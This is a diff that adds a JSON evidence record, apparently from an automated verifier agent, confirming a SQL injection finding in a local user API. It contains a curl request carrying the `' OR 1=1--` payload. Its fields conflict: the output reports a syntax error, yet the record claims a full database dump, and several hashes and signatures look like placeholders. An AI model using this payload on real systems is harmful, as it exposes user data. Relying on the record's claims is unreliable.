@@ -1,0 +1,48 @@
+{
+  "evidence_id": "SK-EVID-10293847-5647-3829-1029-485720194829",
+  "finding_id": "SK-FIND-9281a4b2-0193-4812-a128-48291048201a",
+  "verification_type": "REPRODUCER_EXECUTION",
+  "status": "VERIFIED_TRUE_POSITIVE",
+  "verifier_agent_id": "agent-verifier-pytest-02",
+  "sandbox_environment": {
+    "runtime": "docker_isolated",
+    "network_isolated": true,
+    "timeout_ms": 30000,
+    "container_image_digest": "sha256:sandbox-runner-node24-safe",
+    "os_platform": "linux-x86_64",
+    "lockfile_sha256": "4a123f890123456789abcdef0123456789abcdef0123456789abcdef01234567"
+  },
+  "reproducer_artifact": {
+    "script_path": "workspace/poc_reproduce.ts",
+    "script_sha256": "4a123f890123456789abcdef0123456789abcdef0123456789abcdef01234567",
+    "exit_code": 1,
+    "stdout": "FAILED: SQL syntax error leaked in response: syntax error near '--'",
+    "stderr": "",
+    "execution_duration_ms": 420
+  },
+  "reproduction_proof": {
+    "proof_type": "EXECUTABLE_POC",
+    "payload": "curl 'http://localhost:3000/api/v1/users?id=1%27%20OR%201=1--'",
+    "expected_behavior": "HTTP 400 Bad Request or single user object",
+    "observed_vulnerable_behavior": "HTTP 200 with complete database dump of all user records"
+  },
+  "system_trace": {
+    "network_egress": [
+      "127.0.0.1:5432"
+    ],
+    "syscall_trace": [
+      "socket",
+      "connect",
+      "write",
+      "read"
+    ]
+  },
+  "chain_hash": "99aabbccddeeff00112233445566778899aabbccddeeff001122334455667788",
+  "signature": {
+    "verifying_agent_id": "agent-verifier-pytest-02",
+    "public_key": "ed25519-pk-992182019283019283019283",
+    "signature": "ed25519-sig-evidence-valid-proof-0001",
+    "signed_at": "2026-11-06T14:12:00Z"
+  },
+  "recorded_at": "2026-11-06T14:12:00Z"
+}
